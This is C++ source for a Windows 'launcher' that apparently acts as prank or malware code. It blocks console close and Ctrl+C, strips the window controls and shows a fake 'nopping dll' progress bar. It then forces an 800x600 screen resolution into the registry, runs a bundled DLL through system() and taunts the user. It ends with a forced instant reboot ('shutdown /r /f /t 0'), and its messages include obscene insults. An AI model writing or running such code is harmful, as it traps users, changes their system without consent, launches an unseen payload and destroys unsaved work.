#include <windows.h>  
#include <iostream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <cstdio> 
#include <cstdlib>
#include <ctime>
#ifdef _WIN32
#include <windows.h>  
#endif

 void ChangeScreenResolution(int width, int height, int frequency) {
    DEVMODE dm = { 0 };
    dm.dmSize = sizeof(dm);
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm) != 0) {
        dm.dmPelsWidth = width;
        dm.dmPelsHeight = height;
        dm.dmDisplayFrequency = frequency;
        dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_DISPLAYFREQUENCY;
        LONG result = ChangeDisplaySettings(&dm, CDS_TEST);
        ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
    }
}


    void enableANSI() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD dwMode = 0;
        if (GetConsoleMode(hOut, &dwMode)) {
            dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
            SetConsoleMode(hOut, dwMode);
        }
    }
    }


BOOL WINAPI ConsoleHandler(DWORD ctrlType) {
    if (ctrlType == CTRL_C_EVENT || ctrlType == CTRL_BREAK_EVENT || ctrlType == CTRL_CLOSE_EVENT) {
        return TRUE;
    }
    return FALSE;
}
void disableConsoleSelection() {
    HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
    DWORD prev_mode;
    GetConsoleMode(hInput, &prev_mode);
    SetConsoleMode(hInput, ENABLE_EXTENDED_FLAGS | (prev_mode & ~ENABLE_QUICK_EDIT_MODE & ~ENABLE_MOUSE_INPUT));
}

void winecter() {
    SetConsoleTitleA("cheburman launcher");
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        LONG_PTR style = GetWindowLongPtr(hwnd, GWL_STYLE);
        style &= ~WS_SYSMENU;      
        style &= ~WS_MINIMIZEBOX;  
        style &= ~WS_MAXIMIZEBOX;  
        style &= ~WS_THICKFRAME;   
        SetWindowLongPtr(hwnd, GWL_STYLE, style);
    }  
}

    int main(){ disableConsoleSelection(); enableANSI();  
    std::cout << "cheburman launcher\n";
    std::cout << "writed on c++ and batch\n";
        std::filesystem::path filePath = "0x4eburmanx0.dll";
    
    if (std::filesystem::exists(filePath)) {
            std::cout << "nopping dll";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
    std::cout << ". ok\n"; 
    ChangeScreenResolution(800, 600, 60);
    } else {
            std::cout << "nopping dll";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
            std::cout << ".";
            Sleep(50);
    std::cout << ". no\n";
    std::cout << "dll no exist fuck you dildo anal";
    system("pause>nul");
    return 0;
    }

    std::cout << "ok dll nopped";
    Sleep(1000);
    std::cout << "\n";
    system("\"%CD%\\0x4eburmanx0.dll\"");
    std::cout << "\"now watch how your system will turn into flat dildak\"\n";
    std::cout << "- (c) desertant333 and belash\n\n";
    std::cout << "press any key to exit dildo launcher";
    system("pause>nul");
    system("shutdown /r /f /t 0");
    return 0;
    }